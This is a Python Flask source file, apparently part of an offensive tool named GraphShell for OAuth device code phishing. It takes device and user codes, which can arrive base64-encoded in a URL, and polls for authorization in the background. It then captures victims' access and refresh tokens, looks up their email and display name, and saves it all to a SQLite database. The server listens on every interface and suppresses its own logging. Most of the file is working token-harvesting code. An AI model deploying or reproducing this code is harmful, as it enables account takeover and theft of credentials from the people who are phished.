@app.route('/start_session', methods=['POST', 'GET'])
def start_session():
    if request.method == 'POST':
        session_data = request.get_json()
    else:
        tok_param = request.args.get('tok')
        if tok_param:
            try:
                decoded_tok = base64.urlsafe_b64decode(tok_param.encode()).decode()
                session_data = json.loads(decoded_tok)
            except (ValueError, KeyError) as e:
                print(colored("Invalid session data received", "red"))
                return jsonify({'status': 'Invalid session data'}), 400
        else:
            print(colored("Missing tok parameter", "red"))
            return jsonify({'status': 'Missing tok parameter'}), 400

    if not session_data or 'user_code' not in session_data or 'device_code' not in session_data:
        print(colored("Invalid session data received", "red"))
        return jsonify({'status': 'Invalid session data'}), 400

    session_id = session_data['user_code']
    sessions[session_id] = {
        'device_code': session_data['device_code'],
        'user_code': session_data['user_code'],
        'verification_url': session_data['verification_url'],
        'expires_in': session_data['expires_in'],
        'interval': session_data['interval'],
        'message': session_data['message'],
        'status': 'Not Authenticated'
    }
    poll_thread = threading.Thread(target=poll_for_authorization_server, args=(session_id, session_data))
    poll_thread.daemon = True
    poll_thread.start()
    return jsonify({'status': 'Session started', 'session_id': session_id}), 200

@app.route('/poll_session/<session_id>', methods=['GET'])
def poll_session(session_id):
    if session_id in sessions:
        session_data = sessions[session_id]
        auth_response = {'device_code': session_data['device_code']}
        auth_result = poll_for_authorization(auth_response)
        if auth_result:
            update_session_with_auth_result(session_id, auth_result)
            return jsonify({'status': 'Authenticated', 'session_id': session_id, 'access_token': auth_result['access_token']})
        else:
            return jsonify({'status': 'Authorization pending or failed', 'session_id': session_id})
    else:
        return jsonify({'status': 'Session not found', 'session_id': session_id}), 404

def poll_for_authorization_server(session_id, auth_response):
    auth_result = poll_for_authorization(auth_response)
    if auth_result:
        update_session_with_auth_result(session_id, auth_result)
        print(colored(f"\nAuthentication successful for session {session_id}!", "green"))
    else:
        sessions[session_id]['status'] = 'Authorization failed or timed out'
        print(colored(f"\nAuthentication failed or timed out for session {session_id}!", "red"))

def update_session_with_auth_result(session_id, auth_result):
    sessions[session_id]['access_token'] = auth_result['access_token']
    sessions[session_id]['refresh_token'] = auth_result['refresh_token']
    sessions[session_id]['token_details'] = auth_result
    sessions[session_id]['status'] = 'Authenticated'
    
    user_profile = get_user_profile(auth_result['access_token'])
    if user_profile:
        sessions[session_id]['user_email'] = user_profile.get('mail', 'N/A')
        sessions[session_id]['user_display_name'] = user_profile.get('displayName', 'N/A')

    save_session_to_db(session_id, sessions[session_id])


def load_sessions_from_db(db_name):
    conn = sqlite3.connect(db_name)
    c = conn.cursor()
    c.execute('SELECT * FROM sessions')
    rows = c.fetchall()
    for row in rows:
        session_id = row[0]
        sessions[session_id] = {
            'device_code': row[1],
            'user_code': row[2],
            'access_token': row[3],
            'refresh_token': row[4],
            'token_details': json.loads(row[5]),
            'status': row[6],
            'user_email': row[7],
            'user_display_name': row[8]
        }
    conn.close()

def save_session_to_db(session_id, session_data):
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            session_id TEXT PRIMARY KEY,
            device_code TEXT,
            user_code TEXT,
            access_token TEXT,
            refresh_token TEXT,
            token_details TEXT,
            status TEXT,
            user_email TEXT,
            user_display_name TEXT
        )
    ''')
    c.execute('''
        INSERT OR REPLACE INTO sessions (session_id, device_code, user_code, access_token, refresh_token, token_details, status, user_email, user_display_name)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (session_id, session_data['device_code'], session_data.get('user_code'), session_data.get('access_token'), session_data.get('refresh_token'), json.dumps(session_data.get('token_details')), session_data['status'], session_data.get('user_email'), session_data.get('user_display_name')))
    conn.commit()
    conn.close()

def start_flask_app(port=5000, ssl=False):
    # Suppress Flask server startup message
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)

    def run_app():
        if ssl:
            try:
                ssl_context = ('cert.pem', 'key.pem')  # Path to your certificate and key files
                app.run(host='0.0.0.0', port=port, ssl_context=ssl_context)
            except FileNotFoundError:
                print(colored("SSL certs not found. Starting server without SSL...", "red"))
                app.run(host='0.0.0.0', port=port)
        else:
            app.run(host='0.0.0.0', port=port)

    flask_thread = threading.Thread(target=run_app)
    flask_thread.daemon = True
    flask_thread.start()

def main():
    shell = GraphShell()
    shell.cmdloop()

if __name__ == "__main__":
    main()